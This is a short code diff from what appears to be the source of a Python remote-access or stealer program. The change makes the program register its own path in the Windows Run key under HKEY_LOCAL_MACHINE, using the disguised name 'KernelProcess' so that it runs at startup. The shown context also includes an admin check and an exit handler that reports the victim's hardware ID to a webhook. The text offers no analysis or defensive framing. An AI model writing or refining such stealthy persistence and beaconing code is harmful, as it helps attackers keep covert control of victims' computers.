@@ -150,13 +150,16 @@ def addToStartup():
 def addToRegistry():
     try:
         address = os.path.abspath(sys.argv[0])
-        key = reg.HKEY_CURRENT_USER
+
+        key = reg.HKEY_LOCAL_MACHINE
         key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-        
-        with reg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS) as reg_key:
-            reg.SetValueEx(reg_key, "KernelProcess", 0, winreg.REG_SZ, address)
-        
+
+        reg_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
+        reg.SetValueEx(reg_key, "KernelProcess", 0, reg.REG_SZ, address)
+        reg.CloseKey(reg_key)
+
         return True
+
     except:
         return False
     
@@ -234,7 +237,7 @@ def isAdmin():
         return False
 
 def exit_handler():
-    message = hwid + " Has Disconnected."
+    message = hwid + " has disconnected."
     
     webhook.send(message)    
            
